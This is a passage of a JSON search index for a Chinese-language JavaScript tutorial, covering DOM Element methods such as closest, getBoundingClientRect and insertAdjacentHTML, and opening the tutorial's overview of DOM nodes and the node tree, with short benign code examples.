( 'td' ); \u6ce8\u610f\uff0c\u8be5\u65b9\u6cd5\u7684\u53c2\u6570\u662f\u5927\u5c0f\u5199\u4e0d\u654f\u611f\u7684\uff0c\u56e0\u4e3a HTML \u6807\u7b7e\u540d\u4e5f\u662f\u5927\u5c0f\u5199\u4e0d\u654f\u611f\u3002","title":"Element.getElementsByTagName()"},{"location":"dom/element/#elementclosest","text":"Element.closest \u65b9\u6cd5\u63a5\u53d7\u4e00\u4e2a CSS \u9009\u62e9\u5668\u4f5c\u4e3a\u53c2\u6570\uff0c\u8fd4\u56de\u5339\u914d\u8be5\u9009\u62e9\u5668\u7684\u3001\u6700\u63a5\u8fd1\u5f53\u524d\u8282\u70b9\u7684\u4e00\u4e2a\u7956\u5148\u8282\u70b9\uff08\u5305\u62ec\u5f53\u524d\u8282\u70b9\u672c\u8eab\uff09\u3002\u5982\u679c\u6ca1\u6709\u4efb\u4f55\u8282\u70b9\u5339\u914d CSS \u9009\u62e9\u5668\uff0c\u5219\u8fd4\u56de null \u3002 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 // HTML \u4ee3\u7801\u5982\u4e0b // <article> // <div id=\"div-01\">Here is div-01 // <div id=\"div-02\">Here is div-02 // <div id=\"div-03\">Here is div-03</div> // </div> // </div> // </article> var div03 = document . getElementById ( 'div-03' ); // div-03 \u6700\u8fd1\u7684\u7956\u5148\u8282\u70b9 div03 . closest ( \"#div-02\" ) // div-02 div03 . closest ( \"div div\" ) // div-03 div03 . closest ( \"article > div\" ) //div-01 div03 . closest ( \":not(div)\" ) // article \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u7531\u4e8e closest \u65b9\u6cd5\u5c06\u5f53\u524d\u8282\u70b9\u4e5f\u8003\u8651\u5728\u5185\uff0c\u6240\u4ee5\u7b2c\u4e8c\u4e2a closest \u65b9\u6cd5\u8fd4\u56de div-03 \u3002","title":"Element.closest()"},{"location":"dom/element/#elementmatches","text":"Element.matches \u65b9\u6cd5\u8fd4\u56de\u4e00\u4e2a\u5e03\u5c14\u503c\uff0c\u8868\u793a\u5f53\u524d\u5143\u7d20\u662f\u5426\u5339\u914d\u7ed9\u5b9a\u7684 CSS \u9009\u62e9\u5668\u3002 1 2 3 if ( el . matches ( '.someClass' )) { console . log ( 'Match!' ); }","title":"Element.matches()"},{"location":"dom/element/#_7","text":"\u4ee5\u4e0b\u4e09\u4e2a\u65b9\u6cd5\u4e0e Element \u8282\u70b9\u7684\u4e8b\u4ef6\u76f8\u5173\u3002\u8fd9\u4e9b\u65b9\u6cd5\u90fd\u7ee7\u627f\u81ea EventTarget \u63a5\u53e3\uff0c\u8be6\u89c1\u76f8\u5173\u7ae0\u8282\u3002 Element.addEventListener() \uff1a\u6dfb\u52a0\u4e8b\u4ef6\u7684\u56de\u8c03\u51fd\u6570 Element.removeEventListener() \uff1a\u79fb\u9664\u4e8b\u4ef6\u76d1\u542c\u51fd\u6570 Element.dispatchEvent() \uff1a\u89e6\u53d1\u4e8b\u4ef6 1 2 3 4 5 element . addEventListener ( 'click' , listener , false ); element . removeEventListener ( 'click' , listener , false ); var event = new Event ( 'click' ); element . dispatchEvent ( event );","title":"\u4e8b\u4ef6\u76f8\u5173\u65b9\u6cd5"},{"location":"dom/element/#elementscrollintoview","text":"Element.scrollIntoView \u65b9\u6cd5\u6eda\u52a8\u5f53\u524d\u5143\u7d20\uff0c\u8fdb\u5165\u6d4f\u89c8\u5668\u7684\u53ef\u89c1\u533a\u57df\uff0c\u7c7b\u4f3c\u4e8e\u8bbe\u7f6e window.location.hash \u7684\u6548\u679c\u3002 1 2 el . scrollIntoView (); // \u7b49\u540c\u4e8eel.scrollIntoView(true) el . scrollIntoView ( false ); \u8be5\u65b9\u6cd5\u53ef\u4ee5\u63a5\u53d7\u4e00\u4e2a\u5e03\u5c14\u503c\u4f5c\u4e3a\u53c2\u6570\u3002\u5982\u679c\u4e3a true \uff0c\u8868\u793a\u5143\u7d20\u7684\u9876\u90e8\u4e0e\u5f53\u524d\u533a\u57df\u7684\u53ef\u89c1\u90e8\u5206\u7684\u9876\u90e8\u5bf9\u9f50\uff08\u524d\u63d0\u662f\u5f53\u524d\u533a\u57df\u53ef\u6eda\u52a8\uff09\uff1b\u5982\u679c\u4e3a false \uff0c\u8868\u793a\u5143\u7d20\u7684\u5e95\u90e8\u4e0e\u5f53\u524d\u533a\u57df\u7684\u53ef\u89c1\u90e8\u5206\u7684\u5c3e\u90e8\u5bf9\u9f50\uff08\u524d\u63d0\u662f\u5f53\u524d\u533a\u57df\u53ef\u6eda\u52a8\uff09\u3002\u5982\u679c\u6ca1\u6709\u63d0\u4f9b\u8be5\u53c2\u6570\uff0c\u9ed8\u8ba4\u4e3a true \u3002","title":"Element.scrollIntoView()"},{"location":"dom/element/#elementgetboundingclientrect","text":"Element.getBoundingClientRect \u65b9\u6cd5\u8fd4\u56de\u4e00\u4e2a\u5bf9\u8c61\uff0c\u63d0\u4f9b\u5f53\u524d\u5143\u7d20\u8282\u70b9\u7684\u5927\u5c0f\u3001\u4f4d\u7f6e\u7b49\u4fe1\u606f\uff0c\u57fa\u672c\u4e0a\u5c31\u662f CSS \u76d2\u72b6\u6a21\u578b\u7684\u6240\u6709\u4fe1\u606f\u3002 1 var rect = obj . getBoundingClientRect (); \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c getBoundingClientRect \u65b9\u6cd5\u8fd4\u56de\u7684 rect \u5bf9\u8c61\uff0c\u5177\u6709\u4ee5\u4e0b\u5c5e\u6027\uff08\u5168\u90e8\u4e3a\u53ea\u8bfb\uff09\u3002 x \uff1a\u5143\u7d20\u5de6\u4e0a\u89d2\u76f8\u5bf9\u4e8e\u89c6\u53e3\u7684\u6a2a\u5750\u6807 y \uff1a\u5143\u7d20\u5de6\u4e0a\u89d2\u76f8\u5bf9\u4e8e\u89c6\u53e3\u7684\u7eb5\u5750\u6807 height \uff1a\u5143\u7d20\u9ad8\u5ea6 width \uff1a\u5143\u7d20\u5bbd\u5ea6 left \uff1a\u5143\u7d20\u5de6\u4e0a\u89d2\u76f8\u5bf9\u4e8e\u89c6\u53e3\u7684\u6a2a\u5750\u6807\uff0c\u4e0e x \u5c5e\u6027\u76f8\u7b49 right \uff1a\u5143\u7d20\u53f3\u8fb9\u754c\u76f8\u5bf9\u4e8e\u89c6\u53e3\u7684\u6a2a\u5750\u6807\uff08\u7b49\u4e8e x + width \uff09 top \uff1a\u5143\u7d20\u9876\u90e8\u76f8\u5bf9\u4e8e\u89c6\u53e3\u7684\u7eb5\u5750\u6807\uff0c\u4e0e y \u5c5e\u6027\u76f8\u7b49 bottom \uff1a\u5143\u7d20\u5e95\u90e8\u76f8\u5bf9\u4e8e\u89c6\u53e3\u7684\u7eb5\u5750\u6807\uff08\u7b49\u4e8e y + height \uff09 \u7531\u4e8e\u5143\u7d20\u76f8\u5bf9\u4e8e\u89c6\u53e3\uff08viewport\uff09\u7684\u4f4d\u7f6e\uff0c\u4f1a\u968f\u7740\u9875\u9762\u6eda\u52a8\u53d8\u5316\uff0c\u56e0\u6b64\u8868\u793a\u4f4d\u7f6e\u7684\u56db\u4e2a\u5c5e\u6027\u503c\uff0c\u90fd\u4e0d\u662f\u56fa\u5b9a\u4e0d\u53d8\u7684\u3002\u5982\u679c\u60f3\u5f97\u5230\u7edd\u5bf9\u4f4d\u7f6e\uff0c\u53ef\u4ee5\u5c06 left \u5c5e\u6027\u52a0\u4e0a window.scrollX \uff0c top \u5c5e\u6027\u52a0\u4e0a window.scrollY \u3002 \u6ce8\u610f\uff0c getBoundingClientRect \u65b9\u6cd5\u7684\u6240\u6709\u5c5e\u6027\uff0c\u90fd\u628a\u8fb9\u6846\uff08 border \u5c5e\u6027\uff09\u7b97\u4f5c\u5143\u7d20\u7684\u4e00\u90e8\u5206\u3002\u4e5f\u5c31\u662f\u8bf4\uff0c\u90fd\u662f\u4ece\u8fb9\u6846\u5916\u7f18\u7684\u5404\u4e2a\u70b9\u6765\u8ba1\u7b97\u3002\u56e0\u6b64\uff0c width \u548c height \u5305\u62ec\u4e86\u5143\u7d20\u672c\u8eab + padding + border \u3002 \u53e6\u5916\uff0c\u4e0a\u9762\u7684\u8fd9\u4e9b\u5c5e\u6027\uff0c\u90fd\u662f\u7ee7\u627f\u81ea\u539f\u578b\u7684\u5c5e\u6027\uff0c Object.keys \u4f1a\u8fd4\u56de\u4e00\u4e2a\u7a7a\u6570\u7ec4\uff0c\u8fd9\u4e00\u70b9\u4e5f\u9700\u8981\u6ce8\u610f\u3002 1 2 var rect = document . body . getBoundingClientRect (); Object . keys ( rect ) // [] \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c rect \u5bf9\u8c61\u6ca1\u6709\u81ea\u8eab\u5c5e\u6027\uff0c\u800c Object.keys \u65b9\u6cd5\u53ea\u8fd4\u56de\u5bf9\u8c61\u81ea\u8eab\u7684\u5c5e\u6027\uff0c\u6240\u4ee5\u8fd4\u56de\u4e86\u4e00\u4e2a\u7a7a\u6570\u7ec4\u3002","title":"Element.getBoundingClientRect()"},{"location":"dom/element/#elementgetclientrects","text":"Element.getClientRects \u65b9\u6cd5\u8fd4\u56de\u4e00\u4e2a\u7c7b\u4f3c\u6570\u7ec4\u7684\u5bf9\u8c61\uff0c\u91cc\u9762\u662f\u5f53\u524d\u5143\u7d20\u5728\u9875\u9762\u4e0a\u5f62\u6210\u7684\u6240\u6709\u77e9\u5f62\uff08\u6240\u4ee5\u65b9\u6cd5\u540d\u4e2d\u7684 Rect \u7528\u7684\u662f\u590d\u6570\uff09\u3002\u6bcf\u4e2a\u77e9\u5f62\u90fd\u6709 bottom \u3001 height \u3001 left \u3001 right \u3001 top \u548c width \u516d\u4e2a\u5c5e\u6027\uff0c\u8868\u793a\u5b83\u4eec\u76f8\u5bf9\u4e8e\u89c6\u53e3\u7684\u56db\u4e2a\u5750\u6807\uff0c\u4ee5\u53ca\u672c\u8eab\u7684\u9ad8\u5ea6\u548c\u5bbd\u5ea6\u3002 \u5bf9\u4e8e\u76d2\u72b6\u5143\u7d20\uff08\u6bd4\u5982 <div> \u548c <p> \uff09\uff0c\u8be5\u65b9\u6cd5\u8fd4\u56de\u7684\u5bf9\u8c61\u4e2d\u53ea\u6709\u8be5\u5143\u7d20\u4e00\u4e2a\u6210\u5458\u3002\u5bf9\u4e8e\u884c\u5185\u5143\u7d20\uff08\u6bd4\u5982 <span> \u3001 <a> \u3001 <em> \uff09\uff0c\u8be5\u65b9\u6cd5\u8fd4\u56de\u7684\u5bf9\u8c61\u6709\u591a\u5c11\u4e2a\u6210\u5458\uff0c\u53d6\u51b3\u4e8e\u8be5\u5143\u7d20\u5728\u9875\u9762\u4e0a\u5360\u636e\u591a\u5c11\u884c\u3002\u8fd9\u662f\u5b83\u548c Element.getBoundingClientRect() \u65b9\u6cd5\u7684\u4e3b\u8981\u533a\u522b\uff0c\u540e\u8005\u5bf9\u4e8e\u884c\u5185\u5143\u7d20\u603b\u662f\u8fd4\u56de\u4e00\u4e2a\u77e9\u5f62\u3002 1 < span id = \"inline\" > Hello World Hello World Hello World </ span > \u4e0a\u9762\u4ee3\u7801\u662f\u4e00\u4e2a\u884c\u5185\u5143\u7d20 <span> \uff0c\u5982\u679c\u5b83\u5728\u9875\u9762\u4e0a\u5360\u636e\u4e09\u884c\uff0c getClientRects \u65b9\u6cd5\u8fd4\u56de\u7684\u5bf9\u8c61\u5c31\u6709\u4e09\u4e2a\u6210\u5458\uff0c\u5982\u679c\u5b83\u5728\u9875\u9762\u4e0a\u5360\u636e\u4e00\u884c\uff0c getClientRects \u65b9\u6cd5\u8fd4\u56de\u7684\u5bf9\u8c61\u5c31\u53ea\u6709\u4e00\u4e2a\u6210\u5458\u3002 1 2 3 4 5 6 7 var el = document . getElementById ( 'inline' ); el . getClientRects (). length // 3 el . getClientRects ()[ 0 ]. left // 8 el . getClientRects ()[ 0 ]. right // 113.908203125 el . getClientRects ()[ 0 ]. bottom // 31.200000762939453 el . getClientRects ()[ 0 ]. height // 23.200000762939453 el . getClientRects ()[ 0 ]. width // 105.908203125 \u8fd9\u4e2a\u65b9\u6cd5\u4e3b\u8981\u7528\u4e8e\u5224\u65ad\u884c\u5185\u5143\u7d20\u662f\u5426\u6362\u884c\uff0c\u4ee5\u53ca\u884c\u5185\u5143\u7d20\u7684\u6bcf\u4e00\u884c\u7684\u4f4d\u7f6e\u504f\u79fb\u3002 \u6ce8\u610f\uff0c\u5982\u679c\u884c\u5185\u5143\u7d20\u5305\u62ec\u6362\u884c\u7b26\uff0c\u90a3\u4e48\u8be5\u65b9\u6cd5\u4f1a\u628a\u6362\u884c\u7b26\u8003\u8651\u5728\u5185\u3002 1 2 3 4 5 < span id = \"inline\" > Hello World Hello World Hello World </ span > \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c <span> \u8282\u70b9\u5185\u90e8\u6709\u4e09\u4e2a\u6362\u884c\u7b26\uff0c\u5373\u4f7f HTML \u8bed\u8a00\u5ffd\u7565\u6362\u884c\u7b26\uff0c\u5c06\u5b83\u4eec\u663e\u793a\u4e3a\u4e00\u884c\uff0c getClientRects() \u65b9\u6cd5\u4f9d\u7136\u4f1a\u8fd4\u56de\u4e09\u4e2a\u6210\u5458\u3002\u5982\u679c\u884c\u5bbd\u8bbe\u7f6e\u5f97\u7279\u522b\u7a84\uff0c\u4e0a\u9762\u7684 <span> \u5143\u7d20\u663e\u793a\u4e3a6\u884c\uff0c\u90a3\u4e48\u5c31\u4f1a\u8fd4\u56de\u516d\u4e2a\u6210\u5458\u3002","title":"Element.getClientRects()"},{"location":"dom/element/#elementinsertadjacentelement","text":"Element.insertAdjacentElement \u65b9\u6cd5\u5728\u76f8\u5bf9\u4e8e\u5f53\u524d\u5143\u7d20\u7684\u6307\u5b9a\u4f4d\u7f6e\uff0c\u63d2\u5165\u4e00\u4e2a\u65b0\u7684\u8282\u70b9\u3002\u8be5\u65b9\u6cd5\u8fd4\u56de\u88ab\u63d2\u5165\u7684\u8282\u70b9\uff0c\u5982\u679c\u63d2\u5165\u5931\u8d25\uff0c\u8fd4\u56de null \u3002 1 element . insertAdjacentElement ( position , element ); Element.insertAdjacentElement \u65b9\u6cd5\u4e00\u5171\u53ef\u4ee5\u63a5\u53d7\u4e24\u4e2a\u53c2\u6570\uff0c\u7b2c\u4e00\u4e2a\u53c2\u6570\u662f\u4e00\u4e2a\u5b57\u7b26\u4e32\uff0c\u8868\u793a\u63d2\u5165\u7684\u4f4d\u7f6e\uff0c\u7b2c\u4e8c\u4e2a\u53c2\u6570\u662f\u5c06\u8981\u63d2\u5165\u7684\u8282\u70b9\u3002\u7b2c\u4e00\u4e2a\u53c2\u6570\u53ea\u53ef\u4ee5\u53d6\u5982\u4e0b\u7684\u503c\u3002 beforebegin \uff1a\u5f53\u524d\u5143\u7d20\u4e4b\u524d afterbegin \uff1a\u5f53\u524d\u5143\u7d20\u5185\u90e8\u7684\u7b2c\u4e00\u4e2a\u5b50\u8282\u70b9\u524d\u9762 beforeend \uff1a\u5f53\u524d\u5143\u7d20\u5185\u90e8\u7684\u6700\u540e\u4e00\u4e2a\u5b50\u8282\u70b9\u540e\u9762 afterend \uff1a\u5f53\u524d\u5143\u7d20\u4e4b\u540e \u6ce8\u610f\uff0c beforebegin \u548c afterend \u8fd9\u4e24\u4e2a\u503c\uff0c\u53ea\u5728\u5f53\u524d\u8282\u70b9\u6709\u7236\u8282\u70b9\u65f6\u624d\u4f1a\u751f\u6548\u3002\u5982\u679c\u5f53\u524d\u8282\u70b9\u662f\u7531\u811a\u672c\u521b\u5efa\u7684\uff0c\u6ca1\u6709\u7236\u8282\u70b9\uff0c\u90a3\u4e48\u63d2\u5165\u4f1a\u5931\u8d25\u3002 1 2 3 var p1 = document . createElement ( 'p' ) var p2 = document . createElement ( 'p' ) p1 . insertAdjacentElement ( 'afterend' , p2 ) // null \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c p1 \u6ca1\u6709\u7236\u8282\u70b9\uff0c\u6240\u4ee5\u63d2\u5165 p2 \u5230\u5b83\u540e\u9762\u5c31\u5931\u8d25\u4e86\u3002 \u5982\u679c\u63d2\u5165\u7684\u8282\u70b9\u662f\u4e00\u4e2a\u6587\u6863\u91cc\u73b0\u6709\u7684\u8282\u70b9\uff0c\u5b83\u4f1a\u4ece\u539f\u6709\u4f4d\u7f6e\u5220\u9664\uff0c\u653e\u7f6e\u5230\u65b0\u7684\u4f4d\u7f6e\u3002","title":"Element.insertAdjacentElement()"},{"location":"dom/element/#elementinsertadjacenthtmlelementinsertadjacenttext","text":"Element.insertAdjacentHTML \u65b9\u6cd5\u7528\u4e8e\u5c06\u4e00\u4e2a HTML \u5b57\u7b26\u4e32\uff0c\u89e3\u6790\u751f\u6210 DOM \u7ed3\u6784\uff0c\u63d2\u5165\u76f8\u5bf9\u4e8e\u5f53\u524d\u8282\u70b9\u7684\u6307\u5b9a\u4f4d\u7f6e\u3002 1 element . insertAdjacentHTML ( position , text ); \u8be5\u65b9\u6cd5\u63a5\u53d7\u4e24\u4e2a\u53c2\u6570\uff0c\u7b2c\u4e00\u4e2a\u662f\u4e00\u4e2a\u8868\u793a\u6307\u5b9a\u4f4d\u7f6e\u7684\u5b57\u7b26\u4e32\uff0c\u7b2c\u4e8c\u4e2a\u662f\u5f85\u89e3\u6790\u7684 HTML \u5b57\u7b26\u4e32\u3002\u7b2c\u4e00\u4e2a\u53c2\u6570\u53ea\u80fd\u8bbe\u7f6e\u4e0b\u9762\u56db\u4e2a\u503c\u4e4b\u4e00\u3002 beforebegin \uff1a\u5f53\u524d\u5143\u7d20\u4e4b\u524d afterbegin \uff1a\u5f53\u524d\u5143\u7d20\u5185\u90e8\u7684\u7b2c\u4e00\u4e2a\u5b50\u8282\u70b9\u524d\u9762 beforeend \uff1a\u5f53\u524d\u5143\u7d20\u5185\u90e8\u7684\u6700\u540e\u4e00\u4e2a\u5b50\u8282\u70b9\u540e\u9762 afterend \uff1a\u5f53\u524d\u5143\u7d20\u4e4b\u540e 1 2 3 4 5 // HTML \u4ee3\u7801\uff1a<div id=\"one\">one</div> var d1 = document . getElementById ( 'one' ); d1 . insertAdjacentHTML ( 'afterend' , '<div id=\"two\">two</div>' ); // \u6267\u884c\u540e\u7684 HTML \u4ee3\u7801\uff1a // <div id=\"one\">one</div><div id=\"two\">two</div> \u8be5\u65b9\u6cd5\u53ea\u662f\u5728\u73b0\u6709\u7684 DOM \u7ed3\u6784\u91cc\u9762\u63d2\u5165\u8282\u70b9\uff0c\u8fd9\u4f7f\u5f97\u5b83\u7684\u6267\u884c\u901f\u5ea6\u6bd4 innerHTML \u65b9\u6cd5\u5feb\u5f97\u591a\u3002 \u6ce8\u610f\uff0c\u8be5\u65b9\u6cd5\u4e0d\u4f1a\u8f6c\u4e49 HTML \u5b57\u7b26\u4e32\uff0c\u8fd9\u5bfc\u81f4\u5b83\u4e0d\u80fd\u7528\u6765\u63d2\u5165\u7528\u6237\u8f93\u5165\u7684\u5185\u5bb9\uff0c\u5426\u5219\u4f1a\u6709\u5b89\u5168\u98ce\u9669\u3002 Element.insertAdjacentText \u65b9\u6cd5\u5728\u76f8\u5bf9\u4e8e\u5f53\u524d\u8282\u70b9\u7684\u6307\u5b9a\u4f4d\u7f6e\uff0c\u63d2\u5165\u4e00\u4e2a\u6587\u672c\u8282\u70b9\uff0c\u7528\u6cd5\u4e0e Element.insertAdjacentHTML \u65b9\u6cd5\u5b8c\u5168\u4e00\u81f4\u3002 1 2 3 4 5 // HTML \u4ee3\u7801\uff1a<div id=\"one\">one</div> var d1 = document . getElementById ( 'one' ); d1 . insertAdjacentText ( 'afterend' , 'two' ); // \u6267\u884c\u540e\u7684 HTML \u4ee3\u7801\uff1a // <div id=\"one\">one</div>two","title":"Element.insertAdjacentHTML()\uff0cElement.insertAdjacentText()"},{"location":"dom/element/#elementremove","text":"Element.remove \u65b9\u6cd5\u7ee7\u627f\u81ea ChildNode \u63a5\u53e3\uff0c\u7528\u4e8e\u5c06\u5f53\u524d\u5143\u7d20\u8282\u70b9\u4ece\u5b83\u7684\u7236\u8282\u70b9\u79fb\u9664\u3002 1 2 var el = document . getElementById ( 'mydiv' ); el . remove (); \u4e0a\u9762\u4ee3\u7801\u5c06 el \u8282\u70b9\u4ece DOM \u6811\u91cc\u9762\u79fb\u9664\u3002","title":"Element.remove()"},{"location":"dom/element/#elementfocuselementblur","text":"Element.focus \u65b9\u6cd5\u7528\u4e8e\u5c06\u5f53\u524d\u9875\u9762\u7684\u7126\u70b9\uff0c\u8f6c\u79fb\u5230\u6307\u5b9a\u5143\u7d20\u4e0a\u3002 1 document . getElementById ( 'my-span' ). focus (); \u8be5\u65b9\u6cd5\u53ef\u4ee5\u63a5\u53d7\u4e00\u4e2a\u5bf9\u8c61\u4f5c\u4e3a\u53c2\u6570\u3002\u53c2\u6570\u5bf9\u8c61\u7684 preventScroll \u5c5e\u6027\u662f\u4e00\u4e2a\u5e03\u5c14\u503c\uff0c\u6307\u5b9a\u662f\u5426\u5c06\u5f53\u524d\u5143\u7d20\u505c\u7559\u5728\u539f\u59cb\u4f4d\u7f6e\uff0c\u800c\u4e0d\u662f\u6eda\u52a8\u5230\u53ef\u89c1\u533a\u57df\u3002 1 2 3 function getFocus () { document . getElementById ( 'btn' ). focus ({ preventScroll : false }); } \u4e0a\u9762\u4ee3\u7801\u4f1a\u8ba9 btn \u5143\u7d20\u83b7\u5f97\u7126\u70b9\uff0c\u5e76\u6eda\u52a8\u5230\u53ef\u89c1\u533a\u57df\u3002 \u6700\u540e\uff0c\u4ece document.activeElement \u5c5e\u6027\u53ef\u4ee5\u5f97\u5230\u5f53\u524d\u83b7\u5f97\u7126\u70b9\u7684\u5143\u7d20\u3002 Element.blur \u65b9\u6cd5\u7528\u4e8e\u5c06\u7126\u70b9\u4ece\u5f53\u524d\u5143\u7d20\u79fb\u9664\u3002","title":"Element.focus()\uff0cElement.blur()"},{"location":"dom/element/#elementclick","text":"Element.click \u65b9\u6cd5\u7528\u4e8e\u5728\u5f53\u524d\u5143\u7d20\u4e0a\u6a21\u62df\u4e00\u6b21\u9f20\u6807\u70b9\u51fb\uff0c\u76f8\u5f53\u4e8e\u89e6\u53d1\u4e86 click \u4e8b\u4ef6\u3002","title":"Element.click()"},{"location":"dom/element/#_8","text":"Craig Buckler\uff0c How to Translate from DOM to SVG Coordinates and Back Again","title":"\u53c2\u8003\u94fe\u63a5"},{"location":"dom/general/","text":"DOM \u6982\u8ff0 \u00b6 DOM \u00b6 DOM \u662f JavaScript \u64cd\u4f5c\u7f51\u9875\u7684\u63a5\u53e3\uff0c\u5168\u79f0\u4e3a\u201c\u6587\u6863\u5bf9\u8c61\u6a21\u578b\u201d\uff08Document Object Model\uff09\u3002\u5b83\u7684\u4f5c\u7528\u662f\u5c06\u7f51\u9875\u8f6c\u4e3a\u4e00\u4e2a JavaScript \u5bf9\u8c61\uff0c\u4ece\u800c\u53ef\u4ee5\u7528\u811a\u672c\u8fdb\u884c\u5404\u79cd\u64cd\u4f5c\uff08\u6bd4\u5982\u589e\u5220\u5185\u5bb9\uff09\u3002 \u6d4f\u89c8\u5668\u4f1a\u6839\u636e DOM \u6a21\u578b\uff0c\u5c06\u7ed3\u6784\u5316\u6587\u6863\uff08\u6bd4\u5982 HTML \u548c XML\uff09\u89e3\u6790\u6210\u4e00\u7cfb\u5217\u7684\u8282\u70b9\uff0c\u518d\u7531\u8fd9\u4e9b\u8282\u70b9\u7ec4\u6210\u4e00\u4e2a\u6811\u72b6\u7ed3\u6784\uff08DOM Tree\uff09\u3002\u6240\u6709\u7684\u8282\u70b9\u548c\u6700\u7ec8\u7684\u6811\u72b6\u7ed3\u6784\uff0c\u90fd\u6709\u89c4\u8303\u7684\u5bf9\u5916\u63a5\u53e3\u3002 DOM \u53ea\u662f\u4e00\u4e2a\u63a5\u53e3\u89c4\u8303\uff0c\u53ef\u4ee5\u7528\u5404\u79cd\u8bed\u8a00\u5b9e\u73b0\u3002\u6240\u4ee5\u4e25\u683c\u5730\u8bf4\uff0cDOM \u4e0d\u662f JavaScript \u8bed\u6cd5\u7684\u4e00\u90e8\u5206\uff0c\u4f46\u662f DOM \u64cd\u4f5c\u662f JavaScript \u6700\u5e38\u89c1\u7684\u4efb\u52a1\uff0c\u79bb\u5f00\u4e86 DOM\uff0cJavaScript \u5c31\u65e0\u6cd5\u63a7\u5236\u7f51\u9875\u3002\u53e6\u4e00\u65b9\u9762\uff0cJavaScript \u4e5f\u662f\u6700\u5e38\u7528\u4e8e DOM \u64cd\u4f5c\u7684\u8bed\u8a00\u3002\u540e\u9762\u4ecb\u7ecd\u7684\u5c31\u662f JavaScript \u5bf9 DOM \u6807\u51c6\u7684\u5b9e\u73b0\u548c\u7528\u6cd5\u3002 \u8282\u70b9 \u00b6 DOM \u7684\u6700\u5c0f\u7ec4\u6210\u5355\u4f4d\u53eb\u505a\u8282\u70b9\uff08node\uff09\u3002\u6587\u6863\u7684\u6811\u5f62\u7ed3\u6784\uff08DOM \u6811\uff09\uff0c\u5c31\u662f\u7531\u5404\u79cd\u4e0d\u540c\u7c7b\u578b\u7684\u8282\u70b9\u7ec4\u6210\u3002\u6bcf\u4e2a\u8282\u70b9\u53ef\u4ee5\u770b\u4f5c\u662f\u6587\u6863\u6811\u7684\u4e00\u7247\u53f6\u5b50\u3002 \u8282\u70b9\u7684\u7c7b\u578b\u6709\u4e03\u79cd\u3002 Document \uff1a\u6574\u4e2a\u6587\u6863\u6811\u7684\u9876\u5c42\u8282\u70b9 DocumentType \uff1a doctype \u6807\u7b7e\uff08\u6bd4\u5982 <!DOCTYPE html> \uff09 Element \uff1a\u7f51\u9875\u7684\u5404\u79cdHTML\u6807\u7b7e\uff08\u6bd4\u5982 <body> \u3001 <a> \u7b49\uff09 Attr \uff1a\u7f51\u9875\u5143\u7d20\u7684\u5c5e\u6027\uff08\u6bd4\u5982 class=\"right\" \uff09 Text \uff1a\u6807\u7b7e\u4e4b\u95f4\u6216\u6807\u7b7e\u5305\u542b\u7684\u6587\u672c Comment \uff1a\u6ce8\u91ca DocumentFragment \uff1a\u6587\u6863\u7684\u7247\u6bb5 \u6d4f\u89c8\u5668\u63d0\u4f9b\u4e00\u4e2a\u539f\u751f\u7684\u8282\u70b9\u5bf9\u8c61 Node \uff0c\u4e0a\u9762\u8fd9\u4e03\u79cd\u8282\u70b9\u90fd\u7ee7\u627f\u4e86 Node \uff0c\u56e0\u6b64\u5177\u6709\u4e00\u4e9b\u5171\u540c\u7684\u5c5e\u6027\u548c\u65b9\u6cd5\u3002 \u8282\u70b9\u6811 \u00b6 \u4e00\u4e2a\u6587\u6863\u7684\u6240\u6709\u8282\u70b9\uff0c\u6309\u7167\u6240\u5728\u7684\u5c42\u7ea7\uff0c\u53ef\u4ee5\u62bd\u8c61\u6210\u4e00\u79cd\u6811\u72b6\u7ed3\u6784\u3002\u8fd9\u79cd\u6811\u72b6\u7ed3\u6784\u5c31\u662f DOM \u6811\u3002\u5b83\u6709\u4e00\u4e2a\u9876\u5c42\u8282\u70b9\uff0c\u4e0b\u4e00\u5c42\u90fd\u662f\u9876\u5c42\u8282\u70b9\u7684\u5b50\u8282\u70b9\uff0c\u7136\u540e\u5b50\u8282\u70b9\u53c8\u6709\u81ea\u5df1\u7684\u5b50\u8282\u70b9\uff0c\u5c31\u8fd9\u6837\u5c42\u5c42\u884d\u751f\u51fa\u4e00\u4e2a\u91d1\u5b57\u5854\u7ed3\u6784\uff0c\u53c8\u50cf\u4e00\u68f5\u6811\u3002 \u6d4f\u89c8\u5668\u539f\u751f\u63d0\u4f9b document \u8282\u70b9\uff0c\u4ee3\u8868\u6574\u4e2a\u6587\u6863\u3002 1 2 document // \u6574\u4e2a\u6587\u6863\u6811 \u6587\u6863\u7684\u7b2c\u4e00\u5c42\u6709\u4e24\u4e2a\u8282\u70b9\uff0c\u7b2c\u4e00\u4e2a\u662f\u6587\u6863\u7c7b\u578b\u8282\u70b9\uff08 <!doctype html> \uff09\uff0c\u7b2c\u4e8c\u4e2a\u662f HTML \u7f51\u9875\u7684\u9876\u5c42\u5bb9\u5668\u6807\u7b7e <html> \u3002\u540e\u8005\u6784\u6210\u4e86\u6811\u7ed3\u6784\u7684\u6839\u8282\u70b9\uff08root node\uff09\uff0c\u5176\u4ed6 HTML \u6807\u7b7e\u8282\u70b9\u90fd\u662f\u5b83\u7684\u4e0b\u7ea7\u8282\u70b9\u3002 \u9664\u4e86\u6839\u8282\u70b9\uff0c\u5176\u4ed6\u8282\u70b9\u90fd\u6709\u4e09\u79cd\u5c42\u7ea7\u5173\u7cfb\u3002 \u7236\u8282\u70b9\u5173\u7cfb\uff08parentNode\uff09\uff1a\u76f4\u63a5\u7684\u90a3\u4e2a\u4e0a\u7ea7\u8282\u70b9 \u5b50\u8282\u70b9\u5173\u7cfb\uff08childNodes\uff09\uff1a\u76f4\u63a5\u7684\u4e0b\u7ea7\u8282\u70b9 \u540c\u7ea7\u8282\u70b9\u5173\u7cfb\uff08sibling\uff09\uff1a\u62e5\u6709\u540c\u4e00\u4e2a\u7236\u8282\u70b9\u7684\u8282\u70b9 DOM \u63d0\u4f9b\u64cd\u4f5c\u63a5\u53e3\uff0c\u7528\u6765\u83b7\u53d6\u8fd9\u4e09\u79cd\u5173\u7cfb\u7684\u8282\u70b9\u3002\u6bd4\u5982\uff0c\u5b50\u8282\u70b9\u63a5\u53e3\u5305\u62ec firstChild \uff08\u7b2c\u4e00\u4e2a\u5b50\u8282\u70b9\uff09\u548c lastChild 